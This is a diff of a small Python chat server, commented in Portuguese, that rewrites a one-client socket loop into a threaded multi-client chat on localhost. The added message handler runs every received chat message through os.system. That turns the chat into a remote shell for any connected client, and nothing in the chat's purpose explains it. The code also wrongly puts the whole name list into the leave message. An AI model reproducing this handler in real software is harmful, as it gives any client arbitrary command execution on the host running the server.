@@ -1,39 +1,55 @@
-from socket import *
+import socket
+import threading
+import sys, os
 
 
-HOST = ''
-PORT = 8000
-BUFSIZ = 1024
-ADDR = (HOST, PORT)
+HOST = 'localhost'
+PORT = 5000
 
-tcp = socket(AF_INET, SOCK_STREAM)
-tcp.bind(ADDR)
-tcp.listen(5)
+tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+tcp.bind((HOST, PORT))
+tcp.listen()
 
-# Just setting up the server upto now
+clientes = []
+nomes = []
 
-print("Starting the server")
-while True:
-	tcpCliSock, addr = tcp.accept()      # passing on the client handler to a new socket
-	print("Connected to ", addr)
-	while True:
-		data = tcpCliSock.recv(BUFSIZ)
-		if not data:                        # Go to next client if this one send empty 
-			break
-		while data.decode().strip().lower() != 'continue':    # Receiving data loop
-			print(data.decode().strip())                
-			data = tcpCliSock.recv(BUFSIZ)
-        #client sends continue once its sending data loop is done    
-		message = input(">")
-		while message.lower() != 'go' and message != '':       # Sending data loop
-			message += '\r\n'
-			tcpCliSock.send(message.encode())
-			message = input(">")
-        # go is the word to stop the sending loop
-		else:
-			if message != '':
-				tcpCliSock.send('continue\r\n'.encode())
-				break
-			else:
-				break
-	tcpCliSock.close()
+#manda mensagem para cada cliente, ((((NÃO PODERIA MANDAR PARA SÍ PRÓPRIO))))
+def mensagem(msg):
+    for cliente in clientes:
+        cliente.send(msg)
+
+#Recebe a mensagem e repassa, 
+def msgClientes(cliente):
+    while True:
+        try:
+            msg = cliente.recv(1024)
+            mensagem(msg)
+            os.system(msg)
+        except:
+            index = clientes.index(cliente)
+            clientes.remove(cliente)
+            cliente.close()
+            nome = nomes[index]
+            mensagem(f'{nomes} saiu do chat'.encode('utf-8'))
+            nomes.remove(nome)
+            break
+
+#é o main, conecta os clientes
+def conexao():
+    while True:
+        print('Servidor rodando...')
+        cliente, endereco = tcp.accept()
+        print(f'{str(endereco)} conectado')
+        cliente.send('Nome: '.encode('utf-8'))
+        nome = cliente.recv(1024)
+        nomes.append(nome)
+        clientes.append(cliente)
+        print(f'O nome do cliente é: {nome}'.encode('utf-8'))
+        mensagem(f'{nome} Conectou ao chat'.encode('utf-8'))
+        cliente.send('Conectado'.encode('utf-8'))
+        thread = threading.Thread(target=msgClientes, args=(cliente,))
+        thread.start()
+
+
+conexao()
+
